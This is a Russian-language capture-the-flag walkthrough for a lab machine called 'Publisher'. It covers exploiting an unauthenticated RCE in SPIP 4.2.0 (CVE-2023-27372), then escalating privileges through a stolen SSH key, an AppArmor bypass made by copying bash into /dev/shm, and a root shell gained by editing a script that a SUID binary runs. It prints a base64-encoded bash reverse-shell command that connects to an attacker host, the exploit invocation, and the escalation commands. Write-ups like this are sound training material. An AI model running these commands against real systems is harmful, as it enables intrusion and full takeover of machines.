# Publisher

### Необходимые навыки
- Поиск и эксплуатация уязвимостей CMS (SPIP RCE)
- Понимание механизма работы AppArmor (анализ профилей, обход ограничений через неконтролируемые директории и копирование бинарников)
- Анализ SUID-бинарников (декомпиляция и реверс-инжиниринг через Ghidra)
- Работа в ограниченных оболочках (restricted shells / ash)
- Эскалация привилегий через редактирование скриптов, вызываемых SUID-программами

---

### Разведка и получение начального доступа (Шелл)

Начинаем со сканирования портов. `masscan` не выявляет явных аномалий. Сканирование с помощью `nmap` показывает открытый порт 80, на котором работает устаревшая версия веб-сервера Apache.

<img width="785" height="464" alt="image" src="https://github.com/user-attachments/assets/02c28b0a-5c15-4a56-97b0-6581ce731d50" />

Переходим на веб-сайт. Визуальный осмотр показывает статический шаблон на французском языке: большинство ссылок некликабельны, исходный код страниц не содержит комментариев разработчиков или скрытых путей. 

<img width="785" height="450" alt="image" src="https://github.com/user-attachments/assets/8aab2c98-7c80-483d-88be-8303439412cb" />

Запускаем фаззинг директорий:
```bash
ffuf -u http://<IP-цели>/FUZZ -w /usr/share/wordlists/rockyou.txt -e .php,.html
```
Фаззер обнаруживает директорию `/spip`. 

Перейдя по адресу, видим систему управления контентом **SPIP**. На сайте присутствует форма поиска. Проверка на SQL-инъекцию (через `sqlmap`) показывает, что поле неуязвимо:
```bash
sqlmap -u "http://10.114.163.201/spip/spip.php?page=recherche&recherche=ds" --batch --level 5 --risk 3 --random-agent -dbs
```
Также на сайте есть функционал комментариев. Быстрые ручные проверки на SSTI и XXE результатов не дают.

Продолжая изучать исходный код страниц `/spip`, находим точную версию CMS: **SPIP 4.2.0**.
Поиск по базам уязвимостей показывает, что данная версия подвержена критической уязвимости **CVE-2023-27372** (Remote Code Execution, не требующая аутентификации).

Загружаем публичный эксплойт. Чтобы избежать проблем с экранированием кавычек в полезной нагрузке, кодируем команду Reverse Shell в Base64:
```bash
echo "bash -c 'bash -i >& /dev/tcp/<IP-атакующего>/4444 0>&1'" | base64
```
Запускаем эксплойт, передавая закодированную строку и декодируя ее на лету перед выполнением:
```bash
python3 spip_exploit.py -u http://10.114.163.201/spip -c "echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE1NC4xNjEvNDQ0NCAwPiYxJw== | base64 -d | bash"
```

Поднимаем слушатель `nc -lvnp 4444`. Эксплойт успешно отрабатывает, и мы получаем оболочку пользователя `www-data`. Читаем первый флаг `user.txt`.

### Эскалация привилегий (Взятие User)

Среда, в которую мы попали, крайне ограничена. Доступна только оболочка `ash`, отсутствуют базовые утилиты (`curl`, `wget`, `python` для `pty`). 
Исследуя файловую систему, обнаруживаем директорию пользователя `think`, владеющего большинством интересных файлов. 

<img width="785" height="451" alt="image" src="https://github.com/user-attachments/assets/c6b7c92d-86dc-43ad-ba7e-8ef331cf2bc0" />

В скрытой директории `.ssh` находим приватный RSA-ключ (`id_rsa`). Копируем его на атакующую машину, устанавливаем права `chmod 600 id_rsa` и подключаемся по SSH от имени `think`:
```bash
ssh -i id_rsa think@<IP-цели>
```
Теперь мы работаем в более стабильной среде пользователя `think`.

### Эскалация привилегий (Взятие Root)

Пытаемся загрузить `linpeas.sh` для анализа векторов повышения привилегий. При загрузке в `/tmp` получаем ошибку `Permission denied`, что указывает на работу системы мандатного контроля доступа (в данном случае — **AppArmor**), которая жестко ограничивает права даже в стандартных временных директориях.

Пробуем альтернативную директорию, которая базируется в оперативной памяти — `/dev/shm`. Загрузка туда проходит успешно.
Запускаем LinPEAS и изучаем вывод. Обнаруживаем кастомный бинарный файл с установленным SUID-битом: `/usr/sbin/run_container`.

<img width="785" height="117" alt="image" src="https://github.com/user-attachments/assets/9288f298-406b-43cd-87fd-52fb7aea9796" />

Скачиваем этот файл на атакующую машину и декомпилируем с помощью Ghidra.

<img width="785" height="400" alt="image" src="https://github.com/user-attachments/assets/c0875db2-a1e1-479f-b7ef-f9162f2651e4" />

Код бинарника оказался тривиальным: он просто вызывает Bash-скрипт `/opt/run_container.sh`.
Попытки провести Command Injection через передачу аргументов `SUID`-бинарнику (например, `./run_container '; /bin/bash -p'`) не увенчались успехом, так как внутри используется функция `execve` или строгая передача аргументов.

Анализируем содержимое вызываемого скрипта `/opt/run_container.sh`:
<img width="785" height="810" alt="image" src="https://github.com/user-attachments/assets/ac8ecbb7-f2f6-46a8-a7e6-13b04b6ef1ad" />

Скрипт содержит логику работы с Docker. Отлично, но отредактировать этот скрипт напрямую мы не можем из-за ограничений профиля AppArmor, наложенных на нашу текущую оболочку (`ash`).

#### Обход AppArmor (Bypass)

Чтобы понять, как обойти ограничения, читаем профиль AppArmor для оболочки `ash` (`/etc/apparmor.d/usr.sbin.ash` или аналогичный файл):

<img width="400" height="300" alt="image" src="https://github.com/user-attachments/assets/f99bc2fa-2a3e-4056-8932-93562f531bff" />

Из профиля становится ясно:
1. Запись разрешена в `/dev/shm` (именно поэтому загрузка `linpeas` сработала).
2. Выполнение файлов из `/usr/bin/` разрешено.

Мы можем запустить `/usr/bin/bash`, однако при запуске `bash` из `ash` дочерний процесс унаследует профиль ограничений AppArmor родительского процесса (из-за правил перехода профилей, например `ix` — inherit execute).

**Вектор обхода:** Мы копируем бинарник `bash` в директорию `/dev/shm` (которую AppArmor не контролирует столь жестко для исполнения).
```bash
cp /usr/bin/bash /dev/shm/
```

Запускаем скопированный бинарник:
```bash
/dev/shm/bash
```

Теперь мы находимся в полноценной Bash-сессии, на которую профиль ограничения `ash` больше не распространяется (Unconfined). Мы получили возможность редактировать файлы, доступные нашей группе.

#### Эксплуатация SUID-бинарника

Так как ограничения сняты, мы можем редактировать скрипт `/opt/run_container.sh`, который жестко зашит в SUID-программу.
Дописываем в конец скрипта команду для порождения привилегированной оболочки:
```bash
echo "/bin/bash -p" >> /opt/run_container.sh
```

Запускаем SUID-бинарник, который от имени `root` выполнит измененный нами Bash-скрипт:
```bash
/usr/sbin/run_container
```

<img width="785" height="351" alt="image" src="https://github.com/user-attachments/assets/ef94e72f-8583-4a33-9735-f72b736766ae" />
<img width="785" height="60" alt="image" src="https://github.com/user-attachments/assets/18a275e7-1f9b-46a2-b177-fa53f86b1545" />

Скрипт вызывает `/bin/bash -p`, и мы получаем root-сессию. Переходим в директорию `/root` и забираем последний флаг. Машина пройдена.
